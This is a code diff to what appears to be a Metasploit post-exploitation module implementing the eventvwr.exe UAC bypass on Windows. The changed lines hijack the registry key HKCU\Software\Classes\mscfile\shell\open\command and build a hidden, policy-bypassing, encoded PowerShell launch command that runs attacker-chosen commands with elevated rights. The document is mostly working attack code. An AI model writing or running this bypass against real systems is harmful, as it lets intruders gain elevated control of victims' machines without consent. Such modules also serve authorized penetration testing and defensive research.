@@ -115,8 +115,8 @@ class MetasploitModule < Msf::Post
                                         'Vuln dicover : enigma0x3 | mattifestation', # credits
                                 ],
  
-                        'Version'        => '$Revision: 1.3',
-                        'DisclosureDate' => 'jan 4 2017',
+                        'Version'        => '$Revision: 1.4',
+                        'DisclosureDate' => 'jan 5 2017',
                         'Platform'       => 'windows',
                         'Arch'           => 'x86_x64',
                         'Privileged'     => 'false', # thats no need for privilege escalation..
@@ -169,9 +169,10 @@ def ls_stage1
   session = client
   vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
   exec_comm = datastore['EXEC_COMMAND'] # my cmd command to execute (OR powershell shellcode)
-  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # %comspec% path
-  psh_comma = "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
+  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
+  psh_lpath = "%SystemRoot%\\System32\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
+  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['EXEC_COMMAND'] == 'nil'
